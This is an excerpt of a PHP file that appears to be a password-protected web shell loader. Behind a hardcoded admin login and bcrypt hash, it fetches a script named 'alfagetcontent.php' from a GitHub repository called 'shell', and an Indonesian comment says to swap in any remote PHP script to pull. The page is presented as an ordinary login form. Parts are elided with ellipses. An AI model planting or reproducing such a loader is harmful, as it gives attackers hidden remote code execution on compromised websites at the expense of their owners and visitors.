...
$username = "admin";
$passwordHash = '$2y$10$9gtK2RM10K9zAChE/Azfh.afSZhR05nPnFUfVxbuysLfuc45ITevu'; // Hash bcrypt
...
if (isset($_SESSION['loggedin'])) {
    $url = 'https://raw.githubusercontent.com/Toni949/shell/refs/heads/main/alfagetcontent.php'; // Ganti URL dengan lokasi script PHP yang ingin diambil
    ...
    <body>
        <div class="form-container">
            <div class="login-form">
                <img src="https://acehmediacom.wordpress.com/wp-content/uploads/2025/06/ai-logo.jpg" alt="Logo">
                <h2>Login Form</h2>
                <?php if (isset($error)): ?>
